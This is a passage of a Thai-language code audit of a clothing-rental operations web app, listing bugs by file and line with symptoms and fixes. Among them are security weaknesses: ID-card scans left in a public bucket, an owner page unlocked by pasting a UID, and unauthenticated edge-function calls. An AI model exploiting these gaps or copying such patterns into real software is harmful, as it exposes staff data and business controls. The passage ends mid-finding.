**อาการที่ผู้ใช้เจอ:** พนักงาน care กดแถวชุดในหมวด 'ต้องส่งวันนี้/พรุ่งนี้' ที่หน้า งานวันนี้ → เปิด shipout.html แต่ช่องโค้ดว่าง หน้าโชว์ placeholder 'ใส่โค้ดชุดเพื่อสร้างสติ๊กเกอร์' ต้องพิมพ์โค้ดซ้ำเองทุกครั้ง ทั้งที่ URL มีโค้ดอยู่แล้ว

**แนวทางแก้:** เพิ่มท้ายสคริปต์ shipout.html: const q=new URLSearchParams(location.search).get('code'); if(q){ $('code').value=q; load(); } แบบเดียวกับ garment.html:122

### 🟡 ย่อย · `nfc.html:189` — หน้า NFC บังคับรหัสชุดเป็นตัวพิมพ์ใหญ่ (G1) สวนทางทุกหน้าอื่นใน pipeline ที่ lowercase (g1)

nfc.html:189 `const code=$('pairCode').value.trim().toUpperCase()` + input CSS `text-transform:uppercase` (บรรทัด 29) + placeholder 'เช่น G1' (บรรทัด 81) — ขณะที่ทุกหน้าที่รับโค้ดชุด normalize เป็น lowercase: laundry.html:118, repair.html:133, garment.html:81, shipout.html:84 ล้วน `.toLowerCase()` และตัวอย่างโค้ดทุกหน้าคือ 'g1' รวมถึง intake.html:196 ที่ผูก NFC ด้วยโค้ดจาก intake_garment ตรง ๆ (lowercase) ค่าที่ส่งเข้า tag_register จากสองหน้าจึงคนละ case กัน และ writeUrl ก็เขียน 'G1' ลง tag

**อาการที่ผู้ใช้เจอ:** พนักงาน stock พิมพ์/วางโค้ด g1 ในหน้า 'ผูก tag ใหม่' ระบบส่ง 'G1' ไป tag_register — ถ้าโค้ดในฐานข้อมูลเก็บ lowercase และ RPC เทียบตรง ๆ จะเจอ toast 'ไม่พบรหัสชุด G1' ทั้งที่ชุดมีจริง และ URL ที่เขียนลง tag เป็น ?g=G1 คนละ case กับระบบ

**แนวทางแก้:** เปลี่ยนเป็น .toLowerCase() ให้ตรงกับหน้าอื่น (คง text-transform:uppercase ไว้เฉพาะการแสดงผลได้ถ้าต้องการ แต่ค่าใน JS ต้อง lowercase)

### 🟡 ย่อย · `putaway.html:95` — ตาราง map สถานะไม่ตรงกันข้ามหน้า — putaway ไม่รู้จัก lost/needs_review, stock ไม่รู้จัก returned, garment/nfc โชว์ status ดิบ

putaway.html:95 `ST={available,reserved,out,cleaning,repair,retired,returned}` ไม่มี 'lost' และ 'needs_review' ขณะที่ stock.html:65 `ST_TH={available,reserved,out,cleaning,repair,retired,lost,needs_review}` ยืนยันว่าสองสถานะนี้มีอยู่จริงในระบบ (อยู่ใน order list stock.html:71 ด้วย) แต่ stock กลับไม่มี 'returned' ที่ putaway มี ส่วน garment.html:106 (`สถานะ: ${esc(g.status)}`) และ nfc.html:167 แสดง status ดิบภาษาอังกฤษโดยไม่ map เลย

**อาการที่ผู้ใช้เจอ:** พนักงาน stock ใช้ 'ตามหาชุด' ใน putaway กับชุดสถานะ lost หรือ needs_review — tag แสดงคำอังกฤษดิบ 'lost'/'needs_review' แทนคำไทย ทั้งที่หน้า stock แปลได้ · เปิดไทม์ไลน์ชุดใน garment.html เห็น 'สถานะ: cleaning' ภาษาอังกฤษปนไทย

**แนวทางแก้:** แยก map สถานะกลาง (เช่นใส่ใน ops-menu.js หรือไฟล์ shared) แล้วให้ putaway/stock/garment/nfc ใช้ชุดเดียวกันครบทุกค่า: available, reserved, out, cleaning, repair, retired, lost, needs_review, returned

### 🟡 ย่อย · `csv.html:69` — csv.html เป็นหน้ากำพร้า (ไม่มีลิงก์จากที่ไหนเลย) และคอลัมน์ export/import ขาด size/condition/เรทราคา ที่ระบบใช้จริง

(1) grep ทั้ง repo (*.html, *.js) ไม่พบไฟล์ไหนอ้างถึง 'csv.html' เลย และไม่อยู่ใน OPS_NAV (ops-menu.js:8-51) — เข้าถึงได้ทางพิมพ์ URL ตรงเท่านั้น ไม่มี client-side role gate (พึ่ง allowlist ฝั่ง ops-rpc อย่างเดียว) (2) csv.html:69 COLS ไม่มี 'size', 'condition', 'rate_1d/3d/5d', 'acquisition_cost' ทั้งที่ intake.html:89-90,175-184 เก็บ field เหล่านี้ผ่าน intake_garment ตัวเดียวกัน และ stock.html:112 export ก็มี size/condition_grade — ขัดกับหัวหน้า 'ชุดทั้งคลังในไฟล์เดียว' และคำสัญญา 'โค้ดเดิม = อัปเดต'

**อาการที่ผู้ใช้เจอ:** พนักงานหาเมนู CSV ไม่เจอจากหน้าไหนเลย (labels.html ยังลิงก์กลับหา intake ได้ แต่ไม่มีทางเข้า csv) และถ้ารู้ URL แล้ว export ไปแก้ไซส์/สภาพชุดในชีตก็ทำไม่ได้เพราะคอลัมน์ไม่มี — ต้องกลับไปแก้ทีละตัวในหน้า intake

**แนวทางแก้:** เพิ่มลิงก์ csv.html ใน OPS_NAV (จำกัด role manager/owner หรือ stock) และเพิ่มคอลัมน์ size, condition, rate_1d, rate_3d, rate_5d, acquisition_cost ให้ตรงกับ payload ของ intake_garment

### 🟡 ย่อย · `today.html:50` — role gating ไม่สอดคล้อง: top nav ฮาร์ดโค้ดโชว์ market.html ให้ทุก role และมีเพียง nfc.html หน้าเดียวที่มี lock gate

today.html:50 nav ฮาร์ดโค้ด `<a href="/market.html">เฝ้าตลาด</a>` ทั้งที่ ops-menu.js:31 กำหนด market.html ให้เฉพาะ ['marketing','manager'] — พนักงาน care/stock เห็นและกดเข้าได้จากหน้า 'งานวันนี้' (roles:'*') สวนทางเมนู drawer ที่ซ่อนไว้ นอกจากนี้ทุกหน้าในกลุ่มนี้ (today/laundry/shipout/intake/putaway/repair/stock/garment/seller/labels/csv) เรนเดอร์ UI เต็มหน้าโดยไม่มี role/login gate ฝั่ง client — มีเพียง nfc.html:91-98,204-220 ที่มี lock overlay + ops_me check การ enforce จริงอยู่ที่ ops-rpc ต่อ fn เท่านั้น (ops-menu ทำหน้าที่แค่ซ่อนเมนู)

**อาการที่ผู้ใช้เจอ:** พนักงาน role care เปิดหน้า 'งานวันนี้' เห็นลิงก์ 'เฝ้าตลาด' บนแถบบน กดเข้าไปหน้า marketing ได้ทั้งที่เมนู ☰ กรองออกไว้ — ถ้า ops-rpc allowlist ฝั่ง server ไม่ได้กรอง fn ของ market ตาม role ข้อมูลการตลาดจะรั่วถึง role ที่ไม่ควรเห็น (การซ่อนพึ่งเมนูอย่างเดียว)

**แนวทางแก้:** เอา /market.html ออกจาก nav ฮาร์ดโค้ดของ today.html (หรือ render nav จาก opsVisibleNav หลัง ops_me) และพิจารณาใส่ gate แบบ nfc.html ในหน้า sensitive

### 🟡 ย่อย · `laundry.html:120` — ทุก error ของ care_checkin ถูกแสดงเป็น 'ไม่พบชุด' รวมถึง session หมดอายุ/ไม่มีสิทธิ์

laundry.html:120 `if(error||!data||data.error){ $('panel').innerHTML='...ไม่พบชุด '+code...}` — ops-api.js คืน error.message เป็น 'redirecting_to_login', 'เซสชันหมดอายุ เข้าสู่ระบบใหม่', 'ไม่มีสิทธิ์ใช้งานหลังบ้าน' ฯลฯ (ops-api.js:32,41-43) แต่หน้านี้เหมารวมเป็นหาชุดไม่เจอหมด pattern เดียวกันที่ garment.html:83 และ shipout.html:86 ขณะที่ nfc.html:208 แยกกรณี 'redirecting_to_login' ถูกต้อง

**อาการที่ผู้ใช้เจอ:** ป้าแม่บ้าน (role care) เปิดหน้าซัก/QC หลัง LINE session หมดอายุ สแกนชุด g1 ที่มีอยู่จริง → ระบบขึ้น 'ไม่พบชุด g1' สีแดง ป้าเข้าใจว่าชุดหาย/โค้ดผิด ทั้งที่จริงแค่ต้อง login ใหม่ ไม่มีทางรู้จากหน้าจอ

**แนวทางแก้:** แยกแสดง error.message จริงเมื่อ error มาจาก gateway (เช่นเช็ค error.message ก่อน แล้วค่อย fallback เป็น 'ไม่พบชุด') ทั้งใน laundry.html, garment.html, shipout.html


## พนักงาน ops role "marketing" + creator/influencer/ร้านซักภายนอก  — กลุ่ม `ops-marketing`

ยืนยัน 7 ประเด็น (verifier หักล้างทิ้ง 0 ข้อ)

### 🟠 สำคัญ · `laundry-shops.html:105` — doSend() รีเซ็ต dropdown ร้านซักหลังส่งทุกครั้ง ทั้งที่ UI สัญญาว่า "ร้านค้างไว้ให้" — ตัวถัดไปถูกส่งไปร้านผิดแบบเงียบ ๆ

บรรทัด 105: หลัง wash_send สำเร็จ โค้ดทำ `$('wsCode').value=''; $('wsCode').focus(); loadVendors();` แต่ loadVendors() (บรรทัด 137) เขียนทับ `$('wsVendor').innerHTML=vs.filter(v=>v.active).map(...)` ทั้งก้อนโดยไม่เก็บ/คืนค่า selected เดิม → select เด้งกลับไป option แรกเสมอ ขณะที่ข้อความช่วยเหลือบรรทัด 51 บอกผู้ใช้ตรง ๆ ว่า "ร้านค้างไว้ให้ — ส่งหลายตัวไปร้านเดียวกัน พิมพ์รหัสถัดไปกด Enter ได้เลย" และช่อง wsCode มี onkeydown Enter → doSend() (บรรทัด 47) ออกแบบมาเพื่อยิงรัว ๆ

**อาการที่ผู้ใช้เจอ:** พนักงาน care เลือกร้านซัก B (ไม่ใช่ร้านแรกในลิสต์) สแกน g1 กด Enter → ส่งเข้า B สำเร็จ จากนั้นพิมพ์ g2 กด Enter ตามที่หน้าบอก → dropdown ถูกรีเซ็ตเป็นร้าน A ไปแล้ว g2 จึงถูกบันทึกว่าส่งไปร้าน A ผิดร้าน โดยไม่มีคำเตือน ทะเบียน "ชุดอยู่ที่ไหน" เพี้ยนทันที

**แนวทางแก้:** ใน loadVendors() เก็บ `const cur=$('wsVendor').value` ก่อนเขียน innerHTML แล้ว restore `if([...$('wsVendor').options].some(o=>o.value===cur)) $('wsVendor').value=cur;` หรือใน doSend() ไม่ต้องเรียก loadVendors() (อัปเดตแค่ jobs_total เฉพาะจุด)

### 🟠 สำคัญ · `live.html:274` — เรียก edge function live-broadcast โดยส่งแค่ publishable key สาธารณะ ไม่แนบ id_token ของ staff — ต่างจาก pattern ของ marketing-ai/ugc-audit

announce() (บรรทัด 274) fetch `/functions/v1/live-broadcast` ด้วย header `Authorization: Bearer sb_publishable_...` (คีย์สาธารณะที่อยู่ในโค้ดหน้าเว็บ) และ body มีแค่ `{live_id:id}` — ไม่มีข้อมูลระบุตัวตน staff เลย ในขณะที่ endpoint AI อื่นในกลุ่มเดียวกันแนบ id_token เสมอ: marketing.html:238 และ influencers.html:186 ส่ง `id_token:(window.opsIdToken?window.opsIdToken():'')` และ creator.html:165-166 ส่ง `id_token` เข้า ugc-audit ด้วย (ops-api.js:51-52 มีคอมเมนต์ชัดว่า opsIdToken มีไว้ "gate edge functions") market.html:124 (market-scan) ก็มีปัญหาเดียวกัน — ส่ง body '{}' เปล่า ๆ

**อาการที่ผู้ใช้เจอ:** ฝั่ง client ไม่มีทางให้ server แยกแยะว่า caller เป็น staff — ใครก็ตามที่เปิด view-source เอา publishable key + live_id (หรือเดา/ดักได้) สามารถ POST live-broadcast ให้ระบบ LINE broadcast หา follower ทุกคนซ้ำ ๆ ได้ และยิง market-scan เผาโควต้า Anthropic ได้ เว้นแต่ server มีการ gate ด้วยวิธีอื่นที่มองไม่เห็นจากโค้ดนี้

**แนวทางแก้:** แนบ `id_token: window.opsIdToken()` ใน body ของทั้ง live-broadcast (live.html:274) และ market-scan (market.html:124) แล้วให้ function verify + เช็ค role เช่นเดียวกับ marketing-ai

### 🟡 ย่อย · `ops-looks.html:141` — โหลด ops-menu.js แต่ไม่เคยเรียก opsMenu.mount() — หน้าไม่มีเมนู/ทางกลับเลย

ท้ายไฟล์มีแค่ `<script src="ops-menu.js"></script>` (บรรทัด 141) แล้วปิด </body> ทันที ต่างจากหน้า ops อื่นทุกหน้าในกลุ่มนี้ (marketing.html:510, live.html:332, influencers.html:538, ugc.html:172, market.html:187, requests.html:525, laundry-shops.html:180) ที่มี `<script>window.opsMenu&&window.opsMenu.mount();</script>` ตามหลัง ops-menu.js แค่ define function ไว้ ไม่ mount เอง (ops-menu.js:97-134) ปุ่ม ☰ จึงไม่ถูกสร้าง และ .bar ของหน้านี้ (บรรทัด 35) มีแต่ <h1> ไม่มีลิงก์ .nav ใด ๆ ด้วย

**อาการที่ผู้ใช้เจอ:** พนักงาน marketing เปิด "ชุมชน Loop Looks" จากเมนูของหน้าอื่น → เข้ามาแล้วไม่มีปุ่มเมนู ไม่มีลิงก์นำทางใด ๆ ในหน้า ต้องกด back ของเบราว์เซอร์อย่างเดียว (ใน LIFF/in-app browser บางกรณีไม่มีปุ่ม back ให้กด) — เป็นหน้าเดียวในกลุ่ม marketing ที่เมนูหาย

**แนวทางแก้:** เพิ่ม `<script>window.opsMenu&&window.opsMenu.mount();</script>` หลัง `<script src="ops-menu.js"></script>` เหมือนหน้าอื่น

### 🟡 ย่อย · `ops-looks.html:101` — แท็บ "คอมเมนต์" และ "รายงาน" ใช้คลาส .lbrow/.lav/.lnm ที่ไม่ได้นิยามในหน้านี้ — รูปเด้งเต็มขนาดจริง เลย์เอาต์พัง

loadComments() (บรรทัด 101-105) และ loadReports() (บรรทัด 119-124) render `<div class="lbrow">`, `<img class="lav">`, `<div class="lnm">` แต่คลาสพวกนี้นิยามอยู่เฉพาะใน <style> ภายในของ looks.html (looks.html:142-147: `.lav{width:38px;height:38px;border-radius:50%...}`) — ไม่มีใน ops-ui.css (grep แล้วไม่พบ) และไม่มีใน <style> ของ ops-looks.html เอง ดังนั้น `<img class="lav" src=photo>` จึงไม่ถูกจำกัดขนาด

**อาการที่ผู้ใช้เจอ:** พนักงาน marketing กดแท็บ "คอมเมนต์" หรือ "รายงาน" → รูปลุคแต่ละแถวแสดงเต็มความละเอียดต้นฉบับ (อาจกว้างเป็นพันพิกเซล) รายการไม่เป็นแถว ไม่มีเส้นแบ่ง ปุ่มซ่อน/ปลดซ่อนถูกดันไปอยู่ท้ายรูปยักษ์ — ใช้งานตรวจคอมเมนต์/รายงานลำบากมาก

**แนวทางแก้:** ก็อปบล็อกสไตล์ .lbrow/.lav/.lnm จาก looks.html:142-147 มาใส่ <style> ของ ops-looks.html หรือย้ายขึ้น ops-ui.css

### 🟡 ย่อย · `requests.html:346` — คอลัมน์ "คนขอ" hardcode เลข 1 ทุกแถว และไม่มีการเรียงตามดีมานด์ตามที่หัวหน้าเพจอ้าง

renderTable() บรรทัด 346 ใส่ `<td><div class="demand-num">1</div><div class="demand-sub">คน</div></td>` เป็นค่าคงที่ ไม่ได้อ่าน field ใดจาก wishlist_ops_list เลย ขณะที่ .phead บรรทัด 172 บอกว่า "เรียงตามดีมานด์สูงสุด" — ฝั่งลูกค้า (wishlist.html) มีระบบโหวต votes ต่อคำขอ (wishlist.html:858-861 render `r.votes` + doVote) แต่ฝั่ง ops ไม่สะท้อนจำนวนโหวต/จำนวนคนขอจริง และ client ไม่มีการ sort ตามดีมานด์ใด ๆ (loadData → applyFilters ใช้ลำดับที่ server คืนตรง ๆ)

**อาการที่ผู้ใช้เจอ:** ชุดหนึ่งมีลูกค้าโหวตอยากได้ 15 คน อีกชุดมีคนเดียว — พนักงาน marketing เห็นตัวเลข "1 คน" เท่ากันทุกแถว ตัดสินใจเติมสต๊อกผิดลำดับความสำคัญ ทั้งที่หน้าอ้างว่าเรียงตามดีมานด์

**แนวทางแก้:** ให้ wishlist_ops_list คืน vote/demand count แล้ว render `r.votes ?? 1` พร้อม sort ฝั่ง client หรือแก้ข้อความหัวเพจ/ตัดคอลัมน์นี้ออกถ้ายังไม่มีข้อมูล

### 🟡 ย่อย · `creator.html:102` — ชื่อชุดถูกฝังลง onclick attribute โดยตัดแค่ single quote — ชื่อที่มีเครื่องหมายคำพูด (") ทำปุ่ม "รับงานนี้" ตายทั้งปุ่ม และชื่อ render โดยไม่ escape HTML

บรรทัด 102: `onclick="claim('${g.gig_id}','${(g.name||g.garment||'').replace(/'/g,'')}')"` — attribute ครอบด้วย double quote แต่ replace เอาออกเฉพาะ single quote ถ้าชื่อชุดมี `"` ตัว attribute จะถูกตัดจบก่อนเวลา ทำ handler เป็น JS พังและเศษข้อความหลุดเป็น attribute ขยะ จุดเดียวกันซ้ำที่บรรทัด 113 (ปุ่มส่งรูป) และ 138/189 (uploadView/ลองใหม่) นอกจากนี้บรรทัด 97-99 render `${g.name || g.garment}` ตรง ๆ โดยไม่ผ่าน escape ใด ๆ (หน้านี้ไม่มีฟังก์ชัน esc เลย ต่างจากหน้า ops ทุกหน้าที่มี esc()) — ชื่อชุดมาจากข้อมูลที่ staff กรอกใน garment/intake จึงเกิดได้จริง

**อาการที่ผู้ใช้เจอ:** staff ตั้งชื่อชุดว่า `เดรส "Gala Night"` แล้วเปิดงานถ่ายใน ugc.html → creator เปิด creator.html เห็นการ์ดงาน แต่กดปุ่ม "รับงานนี้" แล้วไม่เกิดอะไรขึ้น (onclick พังเพราะ double quote ตัด attribute) รับงานไม่ได้เลยสำหรับชุดนั้น

**แนวทางแก้:** เพิ่มฟังก์ชัน esc() เหมือนหน้าอื่น ใช้กับทุกจุดที่ render g.name/g.garment และเปลี่ยนการส่ง name เข้า claim เป็น index (`onclick="claim(${i})"` แล้ว lookup จาก BOARD.open[i]) แทนการฝัง string

### 🟡 ย่อย · `marketing.html:384` — genGarmentPost อ่าน select id 'gplat'+i ที่ไม่เคยถูก render — โพสต์จากชุดจริงถูกบังคับเป็น Instagram เสมอ

บรรทัด 384: `const platform=document.getElementById('gplat'+i)?document.getElementById('gplat'+i).value:'instagram';` แต่ loadGarments() (บรรทัด 375-379) render การ์ดชุดโดยไม่มี element id `gplat{i}` ที่ไหนเลย (grep ทั้งไฟล์พบ 'gplat' จุดเดียวคือบรรทัดนี้) → เงื่อนไขเป็น false เสมอ ตกไปที่ 'instagram' ตายตัว และ saveGarmentPost (บรรทัด 398) ก็บันทึก `platform:meta.platform||'instagram'` ตามไปด้วย — ตัวเลือกแพลตฟอร์มของฟีเจอร์นี้หายไปจาก UI ทั้งที่โค้ดตั้งใจให้เลือกได้

**อาการที่ผู้ใช้เจอ:** พนักงาน marketing อยากสร้างโพสต์ TikTok จากชุดจริงในการ์ด "โพสต์จากชุดจริง" → ไม่มีที่ให้เลือกแพลตฟอร์ม กด "ให้ AI เขียนโพสต์" แล้วบันทึก ดราฟต์ถูกแท็กเป็น Instagram เสมอ ต้องไปไล่แก้ทีละโพสต์ในส่วน "คอนเทนต์ทั้งหมด" ภายหลัง

**แนวทางแก้:** เพิ่ม `<select id="gplat{i}">` (tiktok/instagram/facebook) ในการ์ดชุดที่ loadGarments() render หรือถ้าไม่ต้องการ selector ให้ลบ dead lookup แล้วใช้ค่าจาก UI กลาง


## เจ้าของ/ผู้จัดการ (owner / manager)  — กลุ่ม `ops-owner`

ยืนยัน 9 ประเด็น (verifier หักล้างทิ้ง 0 ข้อ)

### 🔴 วิกฤต · `hr.html:224` — STAFF_BASE ชี้ /liff/staff.html ที่ไม่มีอยู่ — ลิงก์ยืนยัน UID และลิงก์เซ็นสัญญาจ้างพนักงานพัง 404 ทั้งหมด

hr.html:224 `const STAFF_BASE=(location.origin.includes('http')?location.origin:'https://lloop.app').replace('lloop-ops','lloop')+'/liff/staff.html';` — path ค้างจากตอนที่ไฟล์อยู่ใต้ liff/ แต่ปัจจุบัน staff.html อยู่ที่ repo root (/staff.html) ไม่มีโฟลเดอร์ liff/ ใน repo (ยืนยันจาก ls) ดังนั้นบน wearlloop-dotcom.github.io ลิงก์จะเป็น https://wearlloop-dotcom.github.io/liff/staff.html → 404. ตัวแปรนี้ถูกใช้สร้าง verifyUrl (บรรทัด 297, 323: STAFF_BASE+'?token='+e.verify_token) ที่ปุ่ม 'คัดลอกลิงก์' และใช้สร้างลิงก์สัญญาจ้าง (บรรทัด 619, 669: STAFF_BASE+'?ec='+c.token) ที่ปุ่ม 'เปิด/คัดลอก' ในแท็บสัญญาจ้าง (หมายเหตุ: `location.origin.includes('http')` เป็น true เสมอ และ `.replace('lloop-ops','lloop')` ไม่มีผลบนโดเมนนี้)

**อาการที่ผู้ใช้เจอ:** เจ้าของเพิ่มพนักงานใหม่ใน hr.html แล้วกด 'คัดลอกลิงก์' ยืนยันตัวตนส่งให้พนักงาน → พนักงานเปิดเจอ GitHub Pages 404 ผูก LINE UID ไม่ได้ → สถานะค้าง 'ยังไม่ยืนยัน' เข้าทำงาน/ลงเวลาไม่ได้ · เช่นเดียวกับลิงก์ 'เปิด/คัดลอก' สัญญาจ้างในแท็บสัญญาจ้าง เปิดแล้ว 404 เซ็นสัญญาไม่ได้

**แนวทางแก้:** เปลี่ยนเป็น const STAFF_BASE=location.origin+'/staff.html' (หรือ new URL('staff.html',location.href).href)

### 🟠 สำคัญ · `hr.html:521` — เอกสาร HR (รวมสำเนาบัตรประชาชน) ถูกอัปโหลดเข้า public bucket 'hr-docs' และเก็บเป็น public URL ใครมีลิงก์ก็เปิดได้โดยไม่ต้อง auth

hr.html:518-522 uploadDoc() ใช้ `sb.storage.from('hr-docs').upload(path,f)` ด้วย publishable anon key ตรง ๆ (storage ไม่ได้วิ่งผ่าน gateway — มีแค่ sb.rpc ที่ถูก override) แล้วเรียก `sb.storage.from('hr-docs').getPublicUrl(path)` เก็บ publicUrl ลง hr_doc_add และ render เป็น <a href="${d.url}"> (บรรทัด 511). getPublicUrl ใช้ได้ก็ต่อเมื่อ bucket เป็น public เท่านั้น — ยืนยันจาก staff.html:563 ที่ comment ระบุตรง ๆ ว่า 'เก็บเข้า private bucket ผ่าน edge function kyc แทน public hr-docs (กันลิงก์สาธารณะรั่ว)' คือฝั่งพนักงานถูกย้ายไปใช้ private bucket แล้ว แต่ฝั่งเจ้าของใน hr.html ยังอัปโหลดเข้า public bucket เดิม โดยประเภทเอกสารตัวแรกในฟอร์มคือ 'สำเนาบัตรประชาชน' (hr.html:506)

**อาการที่ผู้ใช้เจอ:** เจ้าของอัปโหลดสำเนาบัตรประชาชนพนักงานในแท็บ 'เอกสาร' → ไฟล์ได้ URL สาธารณะถาวร (pattern เดาได้: <empId>/<timestamp>_ชื่อไฟล์) ใครก็ตามที่ได้ลิงก์ (หลุดจากแชต/history/log) เปิดดูข้อมูลบัตรประชาชนได้โดยไม่ต้องล็อกอิน — ขัดกับ PDPA และขัดกับที่ฝั่ง staff.html แก้ไปแล้ว

**แนวทางแก้:** ให้ hr.html อัปโหลดผ่าน edge function (แบบ kyc ใน staff.html) เข้า private bucket แล้วเปิดดูด้วย signed URL อายุสั้น เหมือน slip_view ใน slips.html

### 🟠 สำคัญ · `forecast.html:340` — forecast.html ข้าม gateway ops-rpc — gate 'เจ้าของเท่านั้น' ใช้แค่การรู้ LINE UID (วางมือได้) และ update_plan_price แก้ราคาแพ็กจริงด้วย anon key + p_uid

ต่างจากทุกหน้า owner อื่นที่ใช้ window.opsRpc (verify LINE idToken ฝั่ง server) forecast.html สร้าง supabase client ด้วย anon key ตรง ๆ (บรรทัด 183 `client()`) แล้ว auth ด้วยการส่ง UID เป็น string: บรรทัด 422-432 `tryUid(uid)` เรียก `forecast_actuals({p_uid:uid})` ถ้า data.owner จริงก็ปลดล็อก + เก็บ localStorage('lloop_owner_uid') และหน้า lock มีช่องให้ 'วาง LINE UID เจ้าของ' (บรรทัด 79) ปลดล็อกเองได้ · ที่หนักคือบรรทัด 340 `update_plan_price({p_uid:OWNER_UID, p_code, p_price, p_rentals})` — เปลี่ยนราคาแพ็กสมาชิกที่ 'มีผลกับหน้าลูกค้าทันที' (ตามข้อความบรรทัด 140/344) โดย credential เดียวคือ UID ซึ่งไม่ใช่ความลับ (โชว์ในหน้า staff.html `<div class="uid">UID: ${lineUid}</div>`, มีปุ่มคัดลอก UID, hr.html ก็มี prompt วาง UID) ไม่มี idToken verification ฝั่ง client เลย

**อาการที่ผู้ใช้เจอ:** ใครก็ตามที่เคยเห็น/ได้ UID ของเจ้าของ (พนักงาน, พาร์ทเนอร์, คนที่เจ้าของเคยส่ง UID ให้) เปิด forecast.html ในเบราว์เซอร์ธรรมดา วาง UID ในช่องปลดล็อก → เห็นรายได้/ลูกค้า/แนวโน้มทั้งหมด และกด 'บันทึก' เปลี่ยนราคาแพ็กสมาชิกจริงที่ลูกค้าเห็นทันที

**แนวทางแก้:** เปลี่ยน forecast.html ให้โหลด ops-api.js แล้วเรียกผ่าน window.opsRpc (gateway ตรวจ idToken + owner_only) ตัดช่องวาง UID และ localStorage cache ออก

### 🟠 สำคัญ · `purchasing.html:239` — datalist วัสดุในฟอร์มสร้างใบสั่งซื้อใส่ UUID เป็น value แต่ createPo จับคู่ด้วยชื่อ — เลือกจากรายการแล้วได้ PO ที่ description เป็น UUID และไม่ลิงก์ supply_id

purchasing.html:239 `const supOpts=SUPPLIES.map(s=>`<option value="${s.id}">${esc(s.name)}</option>`)` ใส่ใน `<datalist id="suplist">` (บรรทัด 245) ที่ผูกกับ input `list="suplist"` ช่อง 'ชื่อรายการ' (บรรทัด 241) — เมื่อผู้ใช้เลือกตัวเลือกจาก datalist ค่าที่ลง input คือ value attribute = UUID ของ supply ไม่ใช่ชื่อ · จากนั้น createPo (บรรทัด 251-252) ทำ `const m=SUPPLIES.find(s=>s.name===it.description)` ซึ่งไม่มีทาง match UUID → supply_id เป็น null และ description ที่ส่งเข้า po_create คือ UUID ดิบ

**อาการที่ผู้ใช้เจอ:** ผู้จัดการเปิดแท็บ 'สร้างใบสั่งซื้อ' พิมพ์ชื่อวัสดุแล้วแตะตัวเลือกที่ระบบแนะนำ → ช่องชื่อกลายเป็นสตริง UUID ยาว ๆ, ใบสั่งซื้อที่สร้างแสดงรายการเป็น UUID อ่านไม่ออก และเพราะ supply_id=null ตอนกด 'รับของ' สต็อกวัสดุ (qty_on_hand) จะไม่ถูกบวกให้ตัวที่ตั้งใจสั่ง — จุดสั่งซื้อ/แจ้งเตือนของใกล้หมดเพี้ยนต่อเนื่อง

**แนวทางแก้:** เปลี่ยน option เป็น value=ชื่อ (`<option value="${esc(s.name)}">`) หรือ match ด้วย id: SUPPLIES.find(s=>s.id===it.description||s.name===it.description)

### 🟠 สำคัญ · `ops-menu.js:8` — role ที่ตั้งได้ใน hr.html (hr_admin, accounting, stylist, sales, admin) ไม่ถูก map ใน OPS_NAV เลย — พนักงานกลุ่มนี้เห็นเมนูแค่ 'งานวันนี้' เข้าหน้างานตัวเองไม่ได้

hr.html:118-129 ให้เจ้าของตั้งตำแหน่งพนักงานได้ 10 ค่า รวม hr_admin ('หัวหน้าฝ่ายบุคคล อนุมัติลา/เบิก/ประกาศ'), accounting ('บัญชี/การเงิน'), stylist, sales, admin — แต่ OPS_NAV ใน ops-menu.js:8-51 ทุก item ใช้ roles จากเซ็ต ['owner','manager','care','stock','marketing'] เท่านั้น และ canSee (บรรทัด 54-58) เช็ค membership ตรง ๆ ดังนั้น role นอกเซ็ตได้เฉพาะ item roles:'*' ซึ่งมีแค่ today.html · ROLE_TH ของ ops-menu.js (บรรทัด 52) ก็ไม่มี role เหล่านี้ ป้ายในเมนูจึงขึ้น 'พนักงาน' · เช่น accounting.html ถูกกำหนด roles:['owner','manager'] (บรรทัด 37) — พนักงานบัญชีเองไม่มีสิทธิ์เห็นเมนูบัญชี, hr_admin ไม่เห็น hr.html (roles:['owner'] บรรทัด 44) ทั้งที่นิยามงานคืออนุมัติลา/เบิก/ประกาศซึ่งทำได้ที่ hr.html เท่านั้น

**อาการที่ผู้ใช้เจอ:** เจ้าของจ้าง 'หัวหน้าฝ่ายบุคคล' (role hr_admin) หรือ 'บัญชี' (role accounting) → พนักงานล็อกอินเข้า ops แล้วเมนู ☰ มีแค่ 'หน้าหลัก' กับ 'งานวันนี้' ไม่มีทางเข้า hr.html/accounting.html เพื่อทำงานตามตำแหน่งของตัวเอง (ป้าย role ขึ้น 'พนักงาน') — ระบบ role สองไฟล์ไม่สอดคล้องกัน

**แนวทางแก้:** เพิ่ม role เหล่านี้เข้า roles ของ item ที่เกี่ยวข้องใน OPS_NAV (เช่น accounting → accounting.html/slips.html, hr_admin → hr.html) และเติม ROLE_TH ให้ครบ พร้อมตรวจ allowlist ฝั่ง ops-rpc ให้ตรงกัน

### 🟡 ย่อย · `accounting.html:284` — accounting.html และ slips.html โหลด ops-menu.js แต่ไม่เคยเรียก opsMenu.mount() — ไม่มีเมนู ☰ นำทางเหมือนหน้าหลังบ้านอื่น

accounting.html:284 และ slips.html:171 มีแค่ `<script src="ops-menu.js"></script>` โดยไม่มี `<script>window.opsMenu&&window.opsMenu.mount();</script>` ตามหลัง — ops-menu.js ไม่ auto-mount (expose แค่ window.opsMenu.mount ตาม ops-menu.js:97-134) ขณะที่ทุกหน้าหลังบ้านอื่นในกลุ่มนี้ (cockpit:162, analytics:618, purchasing:285, contracts:371, branches:235, hr:797, disputes:279, case-file:144, settings:294, stylist-bookings:162) เรียก mount ครบ · แถบหัวของ accounting/slips เองก็ไม่มีลิงก์นำทางใด ๆ (มีแค่ปุ่ม 'ออกจากระบบ')

**อาการที่ผู้ใช้เจอ:** เจ้าของเปิด 'บัญชี' หรือ 'สลิปโอน' จากเมนู ☰ ของหน้าอื่น → ในหน้านั้นไม่มีปุ่ม ☰ และไม่มีลิงก์ไปหน้าอื่นเลย ต้องกด back ของเบราว์เซอร์เพื่อออก (ใน LIFF/LINE in-app browser ยิ่งลำบาก) — สคริปต์เมนูโหลดมาแต่กลายเป็น dead code

**แนวทางแก้:** เพิ่ม <script>window.opsMenu&&window.opsMenu.mount();</script> หลัง ops-menu.js ทั้งสองไฟล์

### 🟡 ย่อย · `forecast.html:72` — forecast.html เป็นหน้ากำพร้า — ไม่มีลิงก์เข้าจากที่ใดใน repo (ไม่อยู่ใน OPS_NAV และไม่มี href จากหน้าไหน)

